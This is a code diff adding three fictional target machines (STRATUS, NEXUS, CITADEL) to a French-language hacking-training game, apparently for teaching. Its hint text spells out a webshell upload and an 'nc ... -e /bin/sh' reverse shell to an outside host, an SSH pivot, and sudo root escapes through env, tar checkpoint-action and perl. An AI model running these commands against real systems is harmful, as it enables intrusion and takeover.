@@ -543,6 +543,224 @@ const MACHINES = [
 
   // ─────────────────────────────────────────────────────────────────
   {
+    id: "stratus",
+    name: "STRATUS",
+    ip: "10.10.11.120",
+    difficulty: "Difficile",
+    os: "Linux (Ubuntu 22.04)",
+    briefing: "Un portail DevOps qui synchronise ses sauvegardes vers un stockage objet. La politique d'accès du bucket a l'air un peu généreuse.",
+    ports: [
+      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 8.9p1 Ubuntu" },
+      { port: 80, proto: "tcp", state: "open", service: "http", version: "nginx 1.18 — Stratus DevOps Portal" },
+    ],
+    web: {
+      "/": "<html>\n<head><title>Stratus DevOps</title></head>\n<body>\n<h1>Stratus DevOps Portal</h1>\n<p>Pipelines & sauvegardes internes.</p>\n<!-- Sauvegardes synchronisées vers s3://stratus-prod-backups (via `cloudctl`) -->\n<!-- TODO: repasser le bucket en privé, il est encore public en lecture -->\n</body>\n</html>",
+    },
+    ftp: { enabled: false },
+    cloud: {
+      provider: "s3",
+      buckets: {
+        "stratus-prod-backups": {
+          public: true,
+          files: {
+            "deploy.env": "# deploy.env — variables d'environnement du déploiement (NE PAS committer)\n" +
+              "APP_ENV=production\nSSH_USER=dsomma\nSSH_PASS=Str4tus_D3ploy!23\n" +
+              "# note : dsomma a un sudo NOPASSWD sur /usr/bin/env pour les diagnostics",
+            "README.txt": "Sauvegardes automatiques du portail Stratus.\nRotation quotidienne. Bucket à repasser en privé (ticket OPS-238, jamais traité).",
+          },
+        },
+        "stratus-internal-keys": {
+          public: false,
+          files: {
+            "id_rsa": "(inaccessible — bucket privé)",
+          },
+        },
+      },
+    },
+    sshUsers: {
+      dsomma: { password: "Str4tus_D3ploy!23" },
+    },
+    targetFS: {
+      hostname: "stratus",
+      homeDir: "/home/dsomma",
+      users: {
+        dsomma: {
+          home: "/home/dsomma",
+          fs: {
+            "user.txt": { type: "file", content: "FLAG{stratus_acces_initial_bucket_public}", perms: "-rw-r-----", owner: "dsomma" },
+            ".bash_history": { type: "file", content: "cloudctl ls\nsudo -l\nexit", perms: "-rw-------", owner: "dsomma" },
+            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings\nEncore un bucket laissé public « le temps de la migration ». R. Kade l'avait signalé dans son audit, capture d'écran à l'appui. Deux semaines plus tard, toujours rien de corrigé.", perms: "-rw-r--r--", owner: "dsomma" },
+          },
+        },
+      },
+      extraFS: {},
+      sudoL: "L'utilisateur dsomma peut lancer les commandes suivantes sur stratus :\n    (root) NOPASSWD: /usr/bin/env",
+    },
+    privesc: {
+      type: "sudo-direct",
+      exploitCmdRegex: /^sudo\s+(\/usr\/bin\/)?env\s+\/bin\/sh$/,
+      enterMsg: "# (shell root obtenu via env -- technique GTFOBins)",
+    },
+    rootFile: { path: "/root/root.txt", content: "FLAG{stratus_root_env_gtfobins}" },
+    hints: {
+      recon: [
+        "Le portail mentionne un stockage objet dans son code source.",
+        "Après `nmap 10.10.11.120`, lis la page d'accueil : `curl http://10.10.11.120/`. Un commentaire HTML cite un bucket `s3://...` et l'outil `cloudctl`.",
+        "Liste ce qui est accessible avec `cloudctl ls`, puis `cloudctl ls s3://stratus-prod-backups` : le bucket est marqué PUBLIC.",
+      ],
+      access: [
+        "Un bucket public en lecture, ça veut dire qu'on peut télécharger son contenu sans authentification.",
+        "Récupère le fichier d'environnement : `cloudctl get s3://stratus-prod-backups/deploy.env`.",
+        "Il contient des identifiants SSH (SSH_USER / SSH_PASS). Connecte-toi avec `ssh dsomma@10.10.11.120`.",
+      ],
+      privesc: [
+        "Le réflexe habituel : `sudo -l` en arrivant.",
+        "`env` est autorisé en NOPASSWD — c'est un classique GTFOBins (il peut lancer un programme arbitraire).",
+        "Exécute `sudo env /bin/sh` pour obtenir un shell root.",
+      ],
+    },
+  },
+
+  // ─────────────────────────────────────────────────────────────────
+  {
+    id: "nexus",
+    name: "NEXUS",
+    ip: "10.10.11.135",
+    difficulty: "Difficile",
+    os: "Linux (Debian 12)",
+    briefing: "Un gestionnaire de fichiers web avec un formulaire d'upload. La validation des fichiers déposés semble se limiter à l'extension.",
+    ports: [
+      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 9.2p1 Debian" },
+      { port: 80, proto: "tcp", state: "open", service: "http", version: "Apache/2.4.57 (Debian) — Nexus File Manager" },
+    ],
+    web: {
+      "/": "<html>\n<head><title>Nexus File Manager</title></head>\n<body>\n<h1>Nexus File Manager</h1>\n<p>Dépose et partage tes fichiers.</p>\n<a href=\"/upload.php\">Uploader un fichier</a>\n<!-- Uploads servis depuis /uploads/ -->\n<!-- TODO: durcir le filtre d'upload, il ne regarde que l'extension -->\n</body>\n</html>",
+      "/upload.php": "Formulaire d'upload Nexus\n\nEnvoie un fichier avec :  curl -F \"file=@<fichier>\" http://10.10.11.135/upload.php\n\n(images uniquement — validation par extension côté serveur)\nLes fichiers acceptés sont ensuite disponibles sous /uploads/.",
+    },
+    ftp: { enabled: false },
+    upload: {
+      formPath: "/upload.php",
+      filenameRegex: /\.(php|phtml|php5|pht)$/i,
+      webshellPath: "/uploads/sh.php",
+      user: "www-data",
+    },
+    altAccess: {
+      path: "/uploads/sh.php",
+      injectRegex: /cmd=[^&]*nc\b/i,
+      user: "www-data",
+      requiresUpload: true,
+    },
+    sshUsers: {},
+    targetFS: {
+      hostname: "nexus",
+      homeDir: "/var/www",
+      users: {
+        "www-data": {
+          home: "/var/www",
+          fs: {
+            "user.txt": { type: "file", content: "FLAG{nexus_acces_initial_webshell_upload}", perms: "-rw-r--r--", owner: "www-data" },
+            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings\nTicket support : « le file manager accepte n'importe quoi tant que ça finit par .php ». Fermé sans correctif, priorité basse. R.K. avait pourtant insisté.", perms: "-rw-r--r--", owner: "www-data" },
+          },
+        },
+      },
+      extraFS: {
+        "/root/infra_notes.txt": {
+          type: "file", perms: "-rw-------", owner: "root", rootOnly: true,
+          content: "Migration en cours vers le segment interne 172.16.20.0/24.\n" +
+            "Base de données interne (bastion) : 172.16.20.10 — SSH ouvert.\n" +
+            "Compte de service temporaire : dbadmin / C1tad3l_Db#77\n" +
+            "À SUPPRIMER une fois la migration finie. — R.K.",
+        },
+      },
+      sudoL: "L'utilisateur www-data peut lancer les commandes suivantes sur nexus :\n    (root) NOPASSWD: /usr/bin/tar",
+    },
+    privesc: {
+      type: "sudo-direct",
+      exploitCmdRegex: /^sudo\s+(\/usr\/bin\/)?tar\s+-cf\s+\/dev\/null\s+\/dev\/null\s+--checkpoint=1\s+--checkpoint-action=exec=\/bin\/sh$/,
+      enterMsg: "# (shell root obtenu via tar --checkpoint-action -- technique GTFOBins)",
+    },
+    rootFile: { path: "/root/root.txt", content: "FLAG{nexus_root_tar_checkpoint}" },
+    hints: {
+      recon: [
+        "Le site propose un formulaire d'upload — c'est souvent un point d'entrée intéressant.",
+        "Après `nmap 10.10.11.135`, regarde `curl http://10.10.11.135/` puis `curl http://10.10.11.135/upload.php` : le filtre ne vérifie que l'extension.",
+        "Un filtre par extension se contourne : un fichier `.php` (ou `.phtml`) passe alors qu'il devrait être rejeté.",
+      ],
+      access: [
+        "Dépose un webshell PHP déguisé : `curl -F \"file=@shell.php\" http://10.10.11.135/upload.php`. Le serveur te répond où il l'a enregistré (/uploads/sh.php).",
+        "Le webshell exécute le paramètre `cmd`. Comme pour une injection de commande, mets-toi en écoute : `nc -lvnp 4444`.",
+        "Déclenche la reverse shell : `curl \"http://10.10.11.135/uploads/sh.php?cmd=nc 10.10.14.1 4444 -e /bin/sh\"` (même port des deux côtés). Tu obtiens un shell www-data.",
+      ],
+      privesc: [
+        "`sudo -l` en tant que www-data révèle une commande NOPASSWD.",
+        "`tar` est autorisé en NOPASSWD — GTFOBins exploite son option `--checkpoint-action` pour exécuter une commande.",
+        "Exécute `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` pour un shell root. Pense ensuite à lire `/root/infra_notes.txt`.",
+      ],
+    },
+  },
+
+  // ─────────────────────────────────────────────────────────────────
+  {
+    id: "citadel",
+    name: "CITADEL",
+    ip: "172.16.20.10",
+    difficulty: "Expert",
+    os: "Linux (Debian 12)",
+    internal: true,
+    pivot: { via: "nexus", pivotIp: "10.10.11.135" },
+    briefing: "Un serveur de base de données interne, injoignable directement. Il faut rebondir depuis une machine déjà compromise du même réseau.",
+    ports: [
+      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 9.2p1 Debian" },
+      { port: 5432, proto: "tcp", state: "open", service: "postgresql", version: "PostgreSQL 15" },
+    ],
+    web: {},
+    ftp: { enabled: false },
+    sshUsers: {
+      dbadmin: { password: "C1tad3l_Db#77" },
+    },
+    targetFS: {
+      hostname: "citadel",
+      homeDir: "/home/dbadmin",
+      users: {
+        dbadmin: {
+          home: "/home/dbadmin",
+          fs: {
+            "user.txt": { type: "file", content: "FLAG{citadel_acces_initial_pivot_ssh_tunnel}", perms: "-rw-r-----", owner: "dbadmin" },
+            ".bash_history": { type: "file", content: "psql -U dbadmin\nsudo -l\nexit", perms: "-rw-------", owner: "dbadmin" },
+            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings\nC'est ici qu'aboutissent les données sensibles. R. Kade s'était connectée à ce bastion la veille de sa disparition. Le dernier maillon avant les preuves — reste AXIOM.", perms: "-rw-r--r--", owner: "dbadmin" },
+          },
+        },
+      },
+      extraFS: {},
+      sudoL: "L'utilisateur dbadmin peut lancer les commandes suivantes sur citadel :\n    (root) NOPASSWD: /usr/bin/perl",
+    },
+    privesc: {
+      type: "sudo-direct",
+      exploitCmdRegex: /^sudo\s+(\/usr\/bin\/)?perl\s+-e\s+'exec\s+"\/bin\/sh";?'$/,
+      enterMsg: "# (shell root obtenu via perl -- technique GTFOBins)",
+    },
+    rootFile: { path: "/root/root.txt", content: "FLAG{citadel_root_perl_gtfobins}" },
+    hints: {
+      recon: [
+        "Cette machine n'est pas routable directement : son IP (172.16.20.10) est sur un segment interne. Il faut d'abord un point d'appui.",
+        "En rootant NEXUS, tu as trouvé `/root/infra_notes.txt` qui pointe vers ce bastion interne. Ouvre un tunnel : `ssh -L 9022:172.16.20.10:22 root@10.10.11.135`.",
+        "Une fois le tunnel établi, l'hôte interne devient joignable : `nmap 172.16.20.10` fonctionne.",
+      ],
+      access: [
+        "Les identifiants du bastion étaient dans la note trouvée sur NEXUS (dbadmin / ...).",
+        "Le tunnel rend l'hôte joignable directement sur son IP interne.",
+        "Connecte-toi avec `ssh dbadmin@172.16.20.10` et le mot de passe trouvé dans `/root/infra_notes.txt` de NEXUS.",
+      ],
+      privesc: [
+        "Toujours `sudo -l` en arrivant.",
+        "`perl` est autorisé en NOPASSWD — GTFOBins propose un one-liner pour sortir un shell.",
+        "Exécute `sudo perl -e 'exec \"/bin/sh\";'` pour obtenir un shell root.",
+      ],
+    },
+  },
+
+  // ─────────────────────────────────────────────────────────────────
+  {
     id: "axiom",
     name: "AXIOM",
     ip: "10.10.11.244",
